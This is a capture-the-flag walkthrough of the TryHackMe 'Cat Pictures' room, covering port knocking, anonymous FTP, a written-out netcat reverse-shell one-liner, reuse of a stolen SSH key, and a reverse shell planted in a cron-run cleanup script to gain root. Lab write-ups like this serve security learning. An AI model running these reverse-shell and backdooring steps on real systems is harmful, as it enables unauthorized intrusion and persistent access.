# Cat Pictures THM Room

The first step to this room is proper enumeration. I used the good old tried and true `nmap -sV <MACHINE-IP>` once again to check open ports.

![Screenshot 2025-03-26 213108](https://github.com/user-attachments/assets/209342f8-07f3-4262-88f3-7f38f3d9c5a6)

port 21 is filtered, we'll get to that a little later. For now I checked out what was on port 8080 and it was a forum. I tried to find a version number or something
like that, I was thinking that an exploit was available due to an outdated version of the software phpBB. Upon further investigation though, there is a clue on the forum that was posted.
It reads, "Knock knock! Magic numbers: 1111, 2222, 3333, 4444." 

![Screenshot 2025-03-26 213600](https://github.com/user-attachments/assets/74c3cfcf-be13-4c4c-8188-469c72e2c84d)

This is a clue related to port knocking, previously something I didn't even know existed. Port knocking is esssentially a way to open a port through a series of specially crafted requests.
The author here gives us a clue, `1111, 2222, 3333, 4444`. I installed `knockd` onto my linux machine and got to work. Trying `knock <MACHINE-IP> 1111 2222 3333 4444` didn't
work, I had to try a few other combinations before I could get the FTP port open again. 

Once the FTP port was finally opened, I connected using `ftp <MACHINE-IP>`. I used the name anonymous and used ls to find what directories were available. I stumbled across note.txt
and used the get command to download it onto my host machine.

![Screenshot 2025-03-26 214205](https://github.com/user-attachments/assets/67cb69ac-72c1-49a5-9f30-c3f97ebe6107)

Reading the note I read that we should connect to port 4420, and that the password is sardinethecat. I used netcat to connect.

![Screenshot 2025-03-26 214642](https://github.com/user-attachments/assets/2517ab15-8f22-4bca-804b-3da5130353cb)

I then used `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MACHINE-IP 4444 >/tmp/f` to create a reverse shell because the CD command didn't work. 

After getting a reverse shell into the system I looked around a bit and found an executable called runme. The only issue is, it was password protected. Luckily though, I was able to find the password by using cat to look at the file. 

![Screenshot 2025-03-26 221622](https://github.com/user-attachments/assets/078876b3-a898-43d0-8809-3576ae433a05)

After entering in the password, I ran ls again to find that id_rsa was now in my current directory. I read the file, then copied and pasted it into a new id_rsa file on my host linux system so I could ssh into the system. I ran `ssh catlover@<MACHINE-IP> -i id_rsa`. I also made sure to run `chmod 600 id_rsa` before running that command because ssh gets weird about permissions if you don't.

![Screenshot 2025-03-26 221836](https://github.com/user-attachments/assets/e091f557-ab36-4b95-8049-aeb0954ec2ee)

From this point I was able to find flag.txt in the root directory

To find the root flag I read the bash history and found that the shell cleans temporary files on the system. From here, I wanted to try to launch a shell onto clean.sh. I ran `nano /opt/clean/clean.sh` and added a reverse shell from pentestmonkey, because I knew this ran all the time, I only had to wait a little bit for the shell to launch, where I found root.txt.


![Screenshot 2025-03-26 223554](https://github.com/user-attachments/assets/34005d4f-89fd-46cc-a415-4e61c3566dc6)
